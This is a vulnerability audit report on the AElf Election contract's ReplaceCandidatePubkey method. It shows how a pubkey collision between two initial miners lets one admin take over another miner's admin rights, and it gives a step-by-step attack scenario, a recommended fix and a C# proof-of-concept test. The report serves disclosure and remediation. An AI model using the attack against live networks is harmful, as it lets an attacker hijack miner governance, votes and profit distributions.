# Audit Report

## Title
Replacement Chain Corruption Enables Pubkey Ownership Hijacking via InitialMiner Collision

## Summary
The `ReplaceCandidatePubkey` method in the Election contract fails to validate whether a new pubkey already exists as a replacement target in the `InitialMiners` list. This allows an attacker controlling one initial miner to reuse another initial miner's replacement pubkey, overwriting critical state mappings (`CandidateReplacementMap` and `InitialPubkeyMap`) and hijacking administrative control over votes, profits, and future replacement operations.

## Finding Description

The vulnerability exists in the `ReplaceCandidatePubkey` method's insufficient validation of the replacement target pubkey. [1](#0-0) 

The critical flaw occurs because the validation at line 191 only checks if `newPubkey` exists in the `Candidates` list, not in `InitialMiners`: [2](#0-1) 

When an initial miner is replaced, the replacement logic correctly adds the new pubkey to `InitialMiners` but NOT to `Candidates` (since initial miners are distinct from announced election candidates): [3](#0-2) 

The `PerformReplacement` function unconditionally overwrites state mappings without checking for existing entries: [4](#0-3) 

**Attack Scenario:**

1. **Initial State:** InitialMiners contains pubkeys A and D (both genesis miners)
2. **Step 1 - Legitimate Replacement:** Alice (admin of A) performs A→B
   - B is added to `InitialMiners`
   - `InitialPubkeyMap[B] = A`
   - `CandidateReplacementMap[B] = A`
   - A is banned
3. **Step 2 - Collision Attack:** Bob (admin of D) performs D→B
   - Line 175 check passes: D is in InitialMiners [5](#0-4) 
   - Line 177-178 ban check passes: B is NOT banned (only A was banned) [6](#0-5) 
   - Line 191 check passes: B is NOT in `Candidates` (it's in `InitialMiners`)
   - Line 282: `CandidateReplacementMap[B] = D` **OVERWRITES A**
   - Line 289: `InitialPubkeyMap[B] = D` **OVERWRITES A**
   - Line 224: B added to `InitialMiners` again, creating **DUPLICATE**

The `PubkeyList` structure uses protobuf repeated fields which allow duplicates: [7](#0-6) 

## Impact Explanation

**Critical Admin Control Hijacking:**

The `GetCandidateAdmin` function resolves admin ownership using `InitialPubkeyMap`: [8](#0-7) 

After the attack, `InitialPubkeyMap[B]` points to D instead of A, causing `GetCandidateAdmin(B)` to return D's admin address instead of A's legitimate admin. This grants the attacker full administrative privileges over B:

1. **Admin Privilege Theft:** The attacker can call `SetCandidateAdmin` to permanently change B's admin or perform further replacements [9](#0-8) 

2. **Voting Asset Theft:** If B accumulated votes, election ranking, or consensus miner position, the attacker gains control over these governance assets

3. **Profit Distribution Theft:** The attacker gains control over profit receivers and treasury distributions associated with pubkey B

4. **State Corruption:** Replacement history permanently corrupted as `CandidateReplacementMap[B]` now incorrectly points to D instead of A

5. **List Integrity Violation:** Duplicate B entries in `InitialMiners` list corrupts miner enumeration logic

## Likelihood Explanation

**HIGH Likelihood:**

1. **Direct Entry Point:** `ReplaceCandidatePubkey` is a publicly accessible method [10](#0-9) 

2. **Minimal Prerequisites:**
   - Two independent initial miners (standard in production networks)
   - One legitimate replacement (normal operational activity)
   - Attacker only needs admin rights to their own initial miner (legitimate ownership)

3. **No Special Privileges Required:** The `IsCurrentCandidateOrInitialMiner` check confirms both candidates and initial miners are valid replacement sources [11](#0-10) 

4. **Low Economic Cost:** Only requires normal transaction fees

5. **No Time Window Dependency:** Attack can be executed at any time after first replacement

6. **High Impact / High Feasibility Ratio:** Minimal effort yields complete admin control theft

## Recommendation

Add comprehensive validation to prevent reusing pubkeys that already exist in the replacement chain:

```csharp
public override Empty ReplaceCandidatePubkey(ReplaceCandidatePubkeyInput input)
{
    Assert(IsCurrentCandidateOrInitialMiner(input.OldPubkey),
        "Pubkey is neither a current candidate nor an initial miner.");
    Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
        "Pubkey is in already banned.");
    
    // Permission check.
    Assert(Context.Sender == GetCandidateAdmin(new StringValue { Value = input.OldPubkey }), "No permission.");
    
    // NEW: Validate newPubkey is not already used in any context
    var candidates = State.Candidates.Value;
    var initialMiners = State.InitialMiners.Value;
    var newPubkeyBytes = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(input.NewPubkey));
    
    Assert(!candidates.Value.Contains(newPubkeyBytes), "New pubkey is already a candidate.");
    Assert(!initialMiners.Value.Contains(newPubkeyBytes), "New pubkey is already an initial miner.");
    Assert(State.CandidateReplacementMap[input.NewPubkey] == null, "New pubkey is already a replacement target.");
    Assert(State.InitialPubkeyMap[input.NewPubkey] == null, "New pubkey is already in replacement chain.");
    
    // Record the replacement.
    PerformReplacement(input.OldPubkey, input.NewPubkey);
    
    // ... rest of the method
}
```

## Proof of Concept

```csharp
[Fact]
public async Task ReplaceCandidatePubkey_InitialMinerCollision_StealAdmin_Test()
{
    // Setup: Get two initial miners from genesis
    var initialMinerA = InitialCoreDataCenterKeyPairs[0];
    var initialMinerD = InitialCoreDataCenterKeyPairs[1];
    var newPubkeyB = ValidationDataCenterKeyPairs[0];
    
    // Set admins for both initial miners
    var adminA = Accounts[1].Address;
    var adminD = Accounts[2].Address;
    await ElectionContractStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
    {
        Pubkey = initialMinerA.PublicKey.ToHex(),
        Admin = adminA
    });
    await ElectionContractStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
    {
        Pubkey = initialMinerD.PublicKey.ToHex(),
        Admin = adminD
    });
    
    // Step 1: Alice (admin A) legitimately replaces A→B
    var adminAStub = GetTester<ElectionContractImplContainer.ElectionContractImplStub>(
        ElectionContractAddress, Accounts[1].KeyPair);
    await adminAStub.ReplaceCandidatePubkey.SendAsync(new ReplaceCandidatePubkeyInput
    {
        OldPubkey = initialMinerA.PublicKey.ToHex(),
        NewPubkey = newPubkeyB.PublicKey.ToHex()
    });
    
    // Verify: Admin of B is adminA
    var adminOfB = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = newPubkeyB.PublicKey.ToHex() });
    adminOfB.ShouldBe(adminA);
    
    // Step 2: Bob (admin D) performs collision attack D→B
    var adminDStub = GetTester<ElectionContractImplContainer.ElectionContractImplStub>(
        ElectionContractAddress, Accounts[2].KeyPair);
    await adminDStub.ReplaceCandidatePubkey.SendAsync(new ReplaceCandidatePubkeyInput
    {
        OldPubkey = initialMinerD.PublicKey.ToHex(),
        NewPubkey = newPubkeyB.PublicKey.ToHex()  // Reusing B!
    });
    
    // VULNERABILITY: Admin of B is now adminD instead of adminA!
    var hijackedAdmin = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = newPubkeyB.PublicKey.ToHex() });
    hijackedAdmin.ShouldBe(adminD); // Admin control hijacked!
    
    // Bob can now call SetCandidateAdmin on B even though Alice was the original owner
    await adminDStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
    {
        Pubkey = newPubkeyB.PublicKey.ToHex(),
        Admin = Accounts[3].Address  // Bob changes B's admin!
    });
}
```

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L173-257)
```csharp
    public override Empty ReplaceCandidatePubkey(ReplaceCandidatePubkeyInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.OldPubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
            "Pubkey is in already banned.");

        // Permission check.
        Assert(Context.Sender == GetCandidateAdmin(new StringValue { Value = input.OldPubkey }), "No permission.");

        // Record the replacement.
        PerformReplacement(input.OldPubkey, input.NewPubkey);

        var oldPubkeyBytes = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(input.OldPubkey));
        var newPubkeyBytes = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(input.NewPubkey));

        //     Remove origin pubkey from Candidates, DataCentersRankingList and InitialMiners; then add new pubkey.
        var candidates = State.Candidates.Value;
        Assert(!candidates.Value.Contains(newPubkeyBytes), "New pubkey is already a candidate.");
        if (candidates.Value.Contains(oldPubkeyBytes))
        {
            candidates.Value.Remove(oldPubkeyBytes);
            candidates.Value.Add(newPubkeyBytes);
            State.Candidates.Value = candidates;
        }

        var rankingList = State.DataCentersRankingList.Value;
        //the profit receiver is not exist but candidate in the data center ranking list
        if (rankingList.DataCenters.ContainsKey(input.OldPubkey))
        {
            rankingList.DataCenters.Add(input.NewPubkey, rankingList.DataCenters[input.OldPubkey]);
            rankingList.DataCenters.Remove(input.OldPubkey);
            State.DataCentersRankingList.Value = rankingList;

            // Notify Profit Contract to update backup subsidy profiting item.
            if (State.ProfitContract.Value == null)
                State.ProfitContract.Value =
                    Context.GetContractAddressByName(SmartContractConstants.ProfitContractSystemName);
            
            var oldProfitReceiver = GetProfitsReceiverOrDefault(input.OldPubkey);
            var profitReceiver = oldProfitReceiver.Value.Any()
                ? oldProfitReceiver
                : null;
            RemoveBeneficiary(input.OldPubkey);
            AddBeneficiary(input.NewPubkey, profitReceiver);
        }

        var initialMiners = State.InitialMiners.Value;
        if (initialMiners.Value.Contains(oldPubkeyBytes))
        {
            initialMiners.Value.Remove(oldPubkeyBytes);
            initialMiners.Value.Add(newPubkeyBytes);
            State.InitialMiners.Value = initialMiners;
        }

        //     For CandidateVotes and CandidateInformation, just replace value of origin pubkey.
        var candidateVotes = State.CandidateVotes[input.OldPubkey];
        if (candidateVotes != null)
        {
            candidateVotes.Pubkey = newPubkeyBytes;
            State.CandidateVotes[input.NewPubkey] = candidateVotes;
            State.CandidateVotes.Remove(input.OldPubkey);
        }

        var candidateInformation = State.CandidateInformationMap[input.OldPubkey];
        if (candidateInformation != null)
        {
            candidateInformation.Pubkey = input.NewPubkey;
            State.CandidateInformationMap[input.NewPubkey] = candidateInformation;
            State.CandidateInformationMap.Remove(input.OldPubkey);
        }

        //     Ban old pubkey.
        State.BannedPubkeyMap[input.OldPubkey] = true;

        ReplaceCandidateProfitsReceiver(input.OldPubkey, input.NewPubkey);
        
        Context.Fire(new CandidatePubkeyReplaced
        {
            OldPubkey = input.OldPubkey,
            NewPubkey = input.NewPubkey
        });

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L280-291)
```csharp
    private void PerformReplacement(string oldPubkey, string newPubkey)
    {
        State.CandidateReplacementMap[newPubkey] = oldPubkey;

        // Initial pubkey is:
        // - miner pubkey of the first round (aka. Initial Miner), or
        // - the pubkey announced election

        var initialPubkey = State.InitialPubkeyMap[oldPubkey] ?? oldPubkey;
        State.InitialPubkeyMap[newPubkey] = initialPubkey;

        State.InitialToNewestPubkeyMap[initialPubkey] = newPubkey;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L19-30)
```csharp
    public override Empty SetCandidateAdmin(SetCandidateAdminInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.Pubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.Pubkey), "Pubkey is already banned.");

        // Permission check
        var pubkey = State.InitialPubkeyMap[input.Pubkey] ?? input.Pubkey;
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L61-64)
```csharp
    private bool IsPubkeyBanned(string pubkey)
    {
        return State.BannedPubkeyMap[pubkey];
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L75-82)
```csharp
    private bool IsCurrentCandidateOrInitialMiner(string pubkey)
    {
        var isCurrentCandidate = State.CandidateInformationMap[pubkey] != null &&
                                 State.CandidateInformationMap[pubkey].IsCurrentCandidate;
        var isInitialMiner = State.InitialMiners.Value.Value.Contains(
            ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(pubkey)));
        return isCurrentCandidate || isInitialMiner;
    }
```

**File:** protobuf/election_contract.proto (L423-426)
```text
message PubkeyList {
    // Candidates’ public keys
    repeated bytes value = 1;
}
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L411-414)
```csharp
    public override Address GetCandidateAdmin(StringValue input)
    {
        return State.CandidateAdmins[State.InitialPubkeyMap[input.Value] ?? input.Value];
    }
```
